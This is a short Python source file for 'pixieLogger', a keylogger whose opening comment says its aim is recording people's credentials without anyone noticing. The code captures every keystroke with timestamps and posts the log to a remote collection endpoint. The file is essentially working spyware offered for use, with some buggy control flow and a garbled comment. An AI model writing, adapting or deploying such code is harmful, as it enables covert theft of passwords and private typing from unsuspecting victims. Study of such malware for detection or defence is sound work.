#!/usr/bin/env python
#   
#   pixieLogger is a light weight cross-platform keylogger program
#   written in Python and is compatible with Python 2.7 - 3.7.
#   The aim of this program is to capture key presses against a timestamp
#   including microtime for realtime playback via a web interface.
#   
#   Why? Because it'd be like recording people's credentials without anyone
#   noticing and with the capacity to play back every single keystroke at
#   realtime with playback controls. That's the aim anyway.
#   

import sys
import requests
import time
import threading
import random
from pynput import keyboard

#   Declarations
keyStore = {}   #   RAM Database to store microtime : key KeyPairs
hash = random.getrandbits(256) #    Unique hash generated to identify the log session. 
endPoint = "https://1234a.com/myCapture.php" #  Where we want the payload to be posted to.

def on_press(key):
    
    try: k = key.char # singhttplible-char keys
    except: k = key.name # other keys
    keyTime = time.time()
    keyStore.update({keyTime: k})

def numEntriesForKeyStore():
    try:
        #Upload keys to remote area using random session identifier.
        requests.post(endPoint, data={"sessionHash": hash, "keyPayload": keyStore})
        keyStore.clear()
        print('Keys sent.')
    except:
        print('Unable to send keys. Let\'s hold off for now.')
    

t1 = threading.Timer(300, numEntriesForKeyStore)    #   Send payloads every 5 minutes.
lis = keyboard.Listener(on_press=on_press)
lis.start() # start to listen on a separate thread
lis.join() # no this if main thread is polling self.keys
t1.start()